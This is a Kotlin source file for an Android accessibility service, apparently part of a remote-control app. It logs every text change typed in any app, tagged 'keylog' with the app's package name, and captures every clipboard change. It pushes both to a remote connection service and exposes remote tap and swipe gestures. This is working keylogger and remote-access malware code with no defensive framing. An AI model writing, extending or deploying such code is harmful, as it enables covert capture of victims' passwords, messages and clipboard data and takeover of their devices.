package com.example.admin

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipboardManager
import android.content.Context
import android.graphics.Path
import android.view.accessibility.AccessibilityEvent

class TouchService : AccessibilityService() {
    companion object { @Volatile var instance: TouchService? = null }
    private var lastClipText = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.addPrimaryClipChangedListener {
            val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
            if (text.isNotEmpty() && text != lastClipText) {
                lastClipText = text
                ConnectionService.push("{\"type\":\"push\",\"kind\":\"clipboard\",\"data\":\"$text\"}")
            }
        }
    }

    override fun onDestroy() { if (instance === this) instance = null; super.onDestroy() }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString(" ")
            if (text.isNotBlank()) {
                val pkg = event.packageName?.toString() ?: "unknown"
                ConnectionService.push("{\"type\":\"push\",\"kind\":\"keylog\",\"data\":\"[$pkg] $text\"}")
            }
        }
    }

    override fun onInterrupt() {}
    fun tap(x: Float, y: Float): Boolean = dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(Path().apply { moveTo(x, y) }, 0L, 50L)).build(), null, null)
    fun swipe(x1: Float, y1: Float, x2: Float, y2: Float, durationMs: Long): Boolean = dispatchGesture(GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(Path().apply { moveTo(x1, y1); lineTo(x2, y2) }, 0L, durationMs.coerceAtLeast(100L))).build(), null, null)
}
